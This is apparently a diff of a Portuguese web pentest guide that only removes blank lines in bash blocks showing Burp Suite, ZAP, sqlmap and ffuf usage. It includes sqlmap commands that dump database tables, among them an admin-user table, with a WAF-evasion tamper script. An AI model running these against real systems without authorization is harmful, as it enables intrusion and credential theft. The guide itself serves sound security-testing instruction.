@@ -30,11 +30,9 @@ Diferente das fases anteriores, voltadas à infraestrutura e rede, esta seção 
 
 ```bash
 # Inicialização padrão da interface gráfica (versão Community ou Professional)
-
 burpsuite
 
 # Inicialização em modo headless (sem GUI), útil para varreduras automatizadas via linha de comando na versão Professional
-
 java -jar [caminho_burpsuite_pro.jar] --project-file=[projeto.burp] --config-file=[config.json] --unpause-spider-and-scanner
 ```
 
@@ -57,19 +55,15 @@ java -jar [caminho_burpsuite_pro.jar] --project-file=[projeto.burp] --config-fil
 
 ```bash
 # Inicialização da interface gráfica padrão
-
 zaproxy
 
 # Varredura rápida e automatizada via linha de comando (modo headless), com relatório em HTML
-
 zap.sh -cmd -quickurl [https://alvo.com] -quickout [relatorio_zap.html]
 
 # Execução de um plano declarativo via Automation Framework (YAML), integrável em esteiras CI/CD
-
 zap.sh -cmd -autorun [plano_automacao.yaml]
 
 # Inicialização em modo daemon expondo a API REST apenas localmente (evite 0.0.0.0, que expõe a API à rede)
-
 zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.key=[chave_api]
 ```
 
@@ -97,21 +91,16 @@ zap.sh -cmd -quickurl https://staging.alvo.com -quickprogress -quickout relatori
 
 ```bash
 # Teste e identificação inicial de injeção em um parâmetro de URL específico
-
 sqlmap -u [http://alvo.com/pagina.php?id=1]
 
 # Varredura a partir de uma requisição HTTP bruta capturada (ex: exportada do Burp Suite), incluindo cookies de sessão
-
 sqlmap -r [requisicao.txt] --batch
 
 # Enumeração de bancos de dados e tabelas após confirmação da injeção
-
 sqlmap -u [http://alvo.com/pagina.php?id=1] --dbs
-
 sqlmap -u [http://alvo.com/pagina.php?id=1] -D [nome_do_banco] --tables
 
 # Extração completa (dump) de uma tabela específica com aplicação de scripts de evasão de WAF
-
 sqlmap -u [http://alvo.com/pagina.php?id=1] -D [banco] -T [tabela] --dump --tamper=space2comment
 ```
 
@@ -121,7 +110,6 @@ sqlmap -u [http://alvo.com/pagina.php?id=1] -D [banco] -T [tabela] --dump --tamp
 
 ```bash
 sqlmap -u "http://alvo.com/noticia.php?id=15" --batch --dbs
-
 sqlmap -u "http://alvo.com/noticia.php?id=15" -D portal_noticias -T usuarios_admin --dump
 ```
 
@@ -141,19 +129,15 @@ sqlmap -u "http://alvo.com/noticia.php?id=15" -D portal_noticias -T usuarios_adm
 
 ```bash
 # Descoberta básica de diretórios e arquivos utilizando uma wordlist padrão
-
 ffuf -w [wordlist.txt] -u [http://alvo.com/FUZZ]
 
 # Fuzzing de subdomínios via manipulação do cabeçalho Host, filtrando por tamanho de resposta
-
 ffuf -w [subdominios.txt] -u [https://alvo.com] -H "Host: FUZZ.alvo.com" -fs [tamanho_a_ignorar]
 
 # Fuzzing de parâmetros em uma requisição POST, ocultando respostas com código 404
-
 ffuf -w [parametros.txt] -u [http://alvo.com/login] -X POST -d "FUZZ=teste" -H "Content-Type: application/x-www-form-urlencoded" -fc 404
 
 # Descoberta recursiva de diretórios com extensões específicas e múltiplas threads
-
 ffuf -w [wordlist.txt] -u [http://alvo.com/FUZZ] -e .php,.bak,.zip -recursion -t 100
 ```
 
